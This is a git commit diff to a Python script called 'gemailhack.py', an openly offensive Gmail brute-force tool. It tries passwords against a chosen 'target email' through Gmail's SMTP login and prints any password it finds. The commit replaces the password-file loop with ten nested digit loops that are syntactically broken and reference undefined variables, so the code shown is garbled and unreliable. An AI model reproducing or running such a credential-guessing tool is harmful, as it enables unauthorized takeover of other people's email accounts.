169f9f2cbd593fd94ce0df99a8426b417924f4a8
dream-devils <60604918+dream-devils@users.noreply.github.com>
2020-03-28 20:19:33 +0530

    Update gemailhack.py

--- gemailhack.py
+++ gemailhack.py
@@ -1,72 +1,54 @@
+
 #!/usr/bin/python
-'''create by Ha3MrX'''
+'''Gmail BruteForce'''
 
 import smtplib
 from os import system
 
 def main():
-   print '================================================='
-   print '               create by Ha3MrX                  '
-   print '================================================='
-   print '               ++++++++++++++++++++              '
-   print '\n                                               '
-   print '  _,.                                            '
-   print '                                                 '
-   print '                                                 '
-   print '           HA3MrX                                '
-   print '       _,.                   '
-   print '     ,` -.)                  '
-   print '    ( _/-\\-._               '
-   print '   /,|`--._,-^|            , '
-   print '   \_| |`-._/||          , | '
-   print '     |  `-, / |         /  / '
-   print '     |     || |        /  /  '
-   print '      `r-._||/   __   /  /   '
-   print '  __,-<_     )`-/  `./  /    '
-   print '  \   `---    \   / /  /     '
-   print '     |           |./  /      '
-   print '     /           //  /       '
-   print ' \_/  \         |/  /        '
-   print '  |    |   _,^- /  /         '
-   print '  |    , ``  (\/  /_         '
-   print '   \,.->._    \X-=/^         '
-   print '   (  /   `-._//^`           '
-   print '    `Y-.____(__}             '
-   print '     |     {__)              ' 
-   print '           ()   V.1.0        '
-
-main()
-print '[1] start the attack'
-print '[2] exit'
-option = input('==>')
+	main()
+print ("[1] start the attack")
+print ("[2] exit")
 if option == 1:
-   file_path = raw_input('path of passwords file :')
-else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
+a = for i in range(0,10):
+		 for j in range(0,10):
+		 	for k in range(0,10):
+		 		for l in range(0,10):
+		 			for m in range(0,10):
+		 				for o in range(0,10):
+		 					for p in range(0,10):
+		 						for q in range(0,10):
+		 							for r in range(0,10):
+		 								for s in range(0,10):
+		 									print("",i,j,k,l,m,o,p,q,r,s)
+		 					
+		 				
+		 			
+		 		
+		 	
+		 
+
 def login():
     i = 0
     user_name = raw_input('target email :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
-    for password in pass_list:
-      i = i + 1
+    for password in a
+     i = i + 1
       print str(i) + '/' + str(len(pass_list))
       try:
          server.login(user_name, password)
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print '[+] Hacked Password :' + password + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print '[+] Hacked Password :' + password + '     ^_^'
 
             break
          else:
